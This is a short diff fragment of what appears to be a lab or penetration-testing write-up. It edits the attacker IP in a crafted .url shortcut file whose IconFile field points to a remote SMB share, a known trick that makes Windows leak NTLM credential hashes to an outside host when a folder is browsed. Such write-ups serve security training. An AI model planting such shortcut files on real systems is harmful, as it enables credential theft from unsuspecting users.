@@ -149,7 +149,7 @@ So we create the following file audir.url. The goal for this file is creating a 
 [InternetShortcut]
 URL=Nomatterwhat
 WorkingDirectory=Lalala
-IconFile=\\192.168.45.201\%USERNAME%\icon.ico
+IconFile=\\192.168.45.152\%USERNAME%\icon.ico
 IconIndex=1 
 ```
 
